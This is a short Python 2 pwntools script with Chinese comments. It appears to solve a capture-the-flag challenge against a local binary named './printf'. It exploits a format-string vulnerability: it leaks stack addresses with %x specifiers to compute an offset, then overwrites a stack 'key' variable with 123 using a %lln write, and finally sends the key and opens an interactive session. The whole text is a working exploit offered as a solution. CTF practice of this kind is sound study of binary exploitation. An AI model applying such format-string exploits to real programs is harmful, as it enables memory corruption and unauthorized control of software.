#!/bin/python
# coding:utf-8 

from pwn import *

p = process('./printf')

# 获取vuln函数的esp和main函数的ebp
print p.recvuntil('(1)\n')
p.sendline('%10$08x%14$08x')

esp = int(p.recv(8),16) - 0x20
ebp = int(p.recv(8),16)

# key地址在栈里的位置偏移量
off = (ebp - esp - 36) / 4

# 将key改成123, 注意key的长度为long long
print p.recvuntil('(2)\n')
p.sendline('%123c%{}$lln'.format(off))

# 后面两次循环没用了
_ = p.recvuntil('(3)\n')
p.send('\n\x00')
_ = p.recvuntil('(4)\n')
p.send('\n\x00')

# 发送key
print p.recvuntil(': \n')
p.sendline('123')

p.interactive()
